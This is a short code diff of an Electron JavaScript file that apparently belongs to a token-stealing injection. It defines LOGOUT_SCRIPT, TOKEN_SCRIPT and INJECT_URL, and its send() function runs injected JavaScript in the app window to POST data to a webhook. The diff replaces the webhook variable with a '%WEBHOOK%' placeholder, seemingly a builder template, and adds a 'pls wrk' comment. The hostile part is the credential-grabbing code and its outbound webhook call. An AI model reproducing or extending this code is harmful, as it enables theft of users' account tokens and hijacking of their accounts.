@@ -1,3 +1,4 @@
+// pls wrk
 const { BrowserWindow, session } = require('electron'),
     { execSync } = require("child_process"),
     { parse } = require("querystring"),
@@ -10,7 +11,7 @@ const [LOGOUT_SCRIPT, TOKEN_SCRIPT, INJECT_URL] = ["window.webpackJsonp?(gg=wind
 
 function send(e, d) {
     return new Promise((resolve, reject) => {   
-      const url = WEBHOOK;
+      const url = '%WEBHOOK%';
         BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(`fetch("${url}", ${JSON.stringify({
             method: 'POST',
             headers: {
